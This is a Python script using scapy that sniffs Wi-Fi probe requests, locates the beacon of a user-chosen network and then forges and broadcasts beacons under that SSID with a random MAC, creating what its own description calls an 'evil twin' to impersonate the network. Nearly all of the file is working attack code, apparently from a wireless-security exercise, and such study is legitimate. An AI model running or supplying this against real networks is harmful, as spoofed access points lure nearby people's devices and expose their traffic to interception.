import argparse
import pandas as pandas
from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeReq, Dot11, Dot11Elt, RadioTap, Dot11Beacon

probes = pandas.DataFrame(columns=["SSID", "source MAC", "Channel"])
# set the index SSID (Name of the AP)
probes.set_index("SSID", inplace=True)

network = pandas.DataFrame(columns=["SSID", "BSSID", "Signal (dBm)", "Channel"])
# set the index SSID (Name of the AP)
network.set_index("SSID", inplace=True)


def find_probes(packet):
    if packet.haslayer(Dot11ProbeReq):
        # get the SSID in the Probe Request
        ssid = packet[Dot11Elt].info.decode()
        if ssid == "":
            ssid = "<empty>"
        # source address of the device searching for network
        source_mac = packet[Dot11].addr2
        # extract network stats
        stats = packet[Dot11ProbeReq].network_stats()
        # get the channel where the AP is requested
        channel_in_probe = stats.get("channel")
        probes.loc[ssid] = (source_mac, channel_in_probe)


def find_ssid(packet):
    # if the packet is a beacon and correspond to the chosen ssid
    if packet.haslayer(Dot11Beacon) and packet[Dot11Elt].info.decode() == chosen_ssid:
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        network.loc[ssid] = (bssid, dbm_signal, channel)


def print_all(stop):
    while True:
        os.system("clear")
        print(probes)
        print(f"Sniffing will end after {sniff_time} seconds...")
        time.sleep(0.5)

        if stop():
            break


def change_channel(stop):
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

        if stop():
            break


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="A python script for detecting probe requests and creating evil twin "
                                                 "of chosen SSID if it is available in the area")
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0'",
                        default="wlan0")
    parser.add_argument("-s", dest="sniff_time", help="Sniffing time (in seconds) to search for probe requests, "
                                                      "default is 20s", default=20)
    parser.add_argument("-c", "--count", help="Number of beacons to send, specify 0 to keep sending "
                                              "infinitely, default is 0", default=0)
    parser.add_argument("--interval",
                        help="The sending frequency (in seconds) between two frames sent, default is 0.1s",
                        default=0.1)

    args = parser.parse_args()

    interface = args.iface
    sniff_time = int(args.sniff_time)
    count = int(args.count)
    interval = float(args.interval)

    stop_threads = False
    # start the thread that prints all the SSID found
    printer = Thread(target=print_all, args=(lambda: stop_threads,))
    printer.daemon = True
    printer.start()

    # start sniffing
    sniff(prn=find_probes, iface=interface, timeout=sniff_time)

    # stop thread used for printing found SSID
    stop_threads = True
    printer.join()

    if probes.empty:
        print("No probe requests detected")
    else:
        chosen_ssid = input("Please choose a network to impersonate by entering its SSID (it must be available in the "
                            "area !) : ")
        stop_threads = False
        # start the thread to change channel and accelerate sniffing
        channel_changer = Thread(target=change_channel, args=(lambda: stop_threads,))
        channel_changer.daemon = True
        channel_changer.start()

        # 15 seconds is normally enough to get a beacon from a network in the area
        print(f"Searching for the network {chosen_ssid} for 15 seconds...\n")
        sniff(prn=find_ssid, iface=interface, timeout=15)

        # stop thread used to change channel
        stop_threads = True
        channel_changer.join()

        if network.empty:
            print(f"Network {chosen_ssid} not found")
        else:
            (bssid, dbm_signal, channel) = network.loc[chosen_ssid]
            print(network)
            choice = input("\nWould you like to create an evil twin ? (y/n) : ")

            if choice == "y":
                # choose a channel 6 channels away from the original network
                channel = (channel + 6) % 14
                # random BSSID as the sender address and AP address
                random_mac = RandMAC()
                # forging a beacon with type 0 and subtype 8 (Management frame and Beacon), broadcast address as
                # destination address
                packet = RadioTap() \
                         / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=random_mac, addr3=random_mac) \
                         / Dot11Beacon() \
                         / Dot11Elt(ID="SSID", info=chosen_ssid, len=len(chosen_ssid)) \
                         / Dot11Elt(ID="DSset", info=chr(channel))

                if count == 0:
                    # if count is 0, it means we loop forever (until interrupt)
                    loop = 1
                    count = None
                    print(
                        f"\n[+] Sending beacons of network {chosen_ssid} on channel {channel} every {interval}s "
                        f"forever...")
                else:
                    loop = 0
                    print(
                        f"\n[+] Sending {count} beacons of network {chosen_ssid} on channel {channel} every {interval}s"
                        f"...")

                # sending beacons
                sendp(packet, inter=interval, count=count, loop=loop, iface=interface, verbose=1)
